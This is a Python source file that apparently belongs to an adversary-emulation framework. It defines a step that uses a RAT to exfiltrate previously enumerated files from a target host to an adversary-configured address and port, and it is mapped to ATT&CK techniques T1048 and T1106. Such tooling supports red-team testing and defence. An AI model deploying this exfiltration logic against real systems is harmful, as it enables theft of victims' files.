from plugins.adversary.app.operation.operation import Step, OPFile, OPHost, OPRat, OPVar


class ExfilAdversaryProfile(Step):
    """
    Description:
        This step exfiltrates target files on a target machine utilizing the chosen adversary's configured
        exfiltration method.
    Requirements:
        This step requires file enumeration to have taken place (DirListCollection).
    """
    attack_mapping = [("T1048", "Exfiltration"), ('T1106', 'Execution')]
    display_name = "exfiltrate_files"
    summary = "Exfil a set of files over adversary defined exfil method"

    preconditions = [('rat', OPRat),
                     ('host', OPHost(OPVar('rat.host'))),
                     ('file', OPFile({'host': OPVar('rat.host'),
                                      'use_case': 'collect'}))]

    postconditions = [('file_g', OPFile({'host': OPVar('rat.host'),
                                         'use_case': 'exfil',
                                         'path': OPVar('file.path')}))]

    significant_parameters = ['file']  # don't keep exfil-ing the same file
    # TODO: Keep adding to this as more methods are created in crater / web's adversary-form.js

    @staticmethod
    def description(rat, host, file):
        return "exfilling {} from {}".format(file.path, host.hostname)

    @staticmethod
    async def simulate(operation, rat, host, file, file_g):
        return True

    @staticmethod
    async def action(operation, rat, host, file, file_g):
        method = operation.adversary_artifactlist.get_exfil_method()
        address = operation.adversary_artifactlist.get_exfil_address()
        port = operation.adversary_artifactlist.get_exfil_port()
        output = await operation.exfil_network_connection(rat, addr=address, port=port, file_path=file.path,
                                                          parser=None, method=method)
        if "Failed to exfil" in output:
            return False
        await file_g()  # create an ObservedFile object for files that we successfully exfilled
        return True
